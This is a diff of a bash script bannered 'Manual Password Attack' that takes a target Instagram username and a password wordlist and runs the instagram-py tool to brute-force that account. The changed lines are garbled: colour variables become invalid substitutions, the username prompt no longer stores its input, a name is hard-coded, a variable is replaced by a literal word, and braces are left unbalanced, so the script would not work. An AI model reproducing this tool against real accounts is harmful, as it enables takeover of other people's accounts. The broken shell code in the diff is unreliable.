@@ -19,7 +19,7 @@ GREEN="\033[92m"
 YELLOW="\033[93m"
 BLUE="\033[94m"
 RED_REV="\033[07;91m"
-DEFCOL="\033[00m"
+DEFCOL="\033"
 
 # The main script starts here
 
@@ -32,24 +32,24 @@ echo -e "${YELLOW}
  _)(_  )  ( \__ \  )(  /(__)\  ) _ (  /(__)\( (__  )  ( 
 (____)(_)\_)(___/ (__)(__)(__)(_) (_)(__)(__)\___)(_)\_)
               
-              ${DEFCOL}[${RED}#${DEFCOL}] ${BLUE}Manual Password Attack ${DEFCOL}[${RED}#${DEFCOL}]"
+              ${"\033[00m"}[${"\033[91m"}#${"\033[00m"}] ${"\033[94m"}Manual Password Attack ${"\033[00m"}[${"\033[91m"}#${"\033[00m"}]"
 echo -e "\n                \e[101m\e[1;77m  >>  Script By SSLRI << \e[0m\n"
 echo -e "\n       \e[100m\e[1;77m >>  instagram : \e[1;96m sslri \e[100m\e[1;77m << \e[0m\n"
 
 # Asking the user to enter the username and password for the target instagram user
-read -p "[#] Enter the username of the target : " username
-read -p "[#] Enter wordlist (passwords) file location : " wordlist
+read -p "[Folami_collection]" 
+read -p "[wordlist] " wordlist
 echo -e ""
 
 # Checking wheter the user specified wordlist file exists or not, and then we continue the process
 if [[ -f $wordlist ]]; then
 	# If the wordlist file specified by the user exists, then we continue the process
 
-	instagram-py --username $username --password-list $wordlist
+	instagram-py -- Folami_collection --password-list wordlist
 else
 	# If the wordlist file specified by the user does not exists, then we display the error message on the console screen
 
-	echo -e "\n${RED_REV}[ Error : The specified wordlist file '${wordlist}' does not exists ]${DEFCOL}"
+	echo -e "\n${"\033[07;91m"[ Error : The specified wordlist file '{wordlist}' does not exists ]${"\033[00m"}"
 	exit 1
 fi
 
